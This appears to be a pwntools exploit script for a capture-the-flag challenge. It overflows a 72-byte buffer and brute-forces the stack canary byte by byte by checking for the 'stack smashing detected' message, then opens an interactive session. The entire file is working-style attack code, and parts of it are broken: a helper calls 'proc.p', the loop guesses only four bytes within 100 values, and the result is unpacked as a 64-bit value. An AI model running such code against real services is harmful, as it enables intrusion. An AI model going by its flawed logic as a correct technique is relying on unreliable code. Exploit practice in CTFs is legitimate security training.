#!/usr/bin/env python3

from pwn import *

exe = ELF('chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe
rop = ROP(exe)

context.terminal = [
    '/mnt/c/Windows/System32/cmd.exe', '/c', 'start', 'wt.exe', '-w', 
    '0', 'split-pane','-d', '.', 'wsl.exe','-d', 'Ubuntu', 'bash', '-c'
]

info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())

def GDB():
    if not args.REMOTE and not args.DOCKER:
        gdb.attach(p, gdbscript='''
        b*vuln

        c
        ''')
        input()

if args.REMOTE:
    p = remote('')
elif args.DOCKER:
    p = remote('127.0.0.1')
else:
    p = process([exe.path])
# GDB()

canary = [0]

for i in range(4):
    for j in range(100):
        payload = cyclic(72) + b''.join([p8(b) for b in canary]) + p8(j)
        sla(b'secret: ', payload)
        if b'*** stack smashing detected ***: terminated\n' not in p.recvuntil(b'flickers.\n'):
            canary.append(j)
            break
            
canary = u64(b''.join([p8(b) for b in canary]))

success("canary: " + hex(canary))
p.interactive()
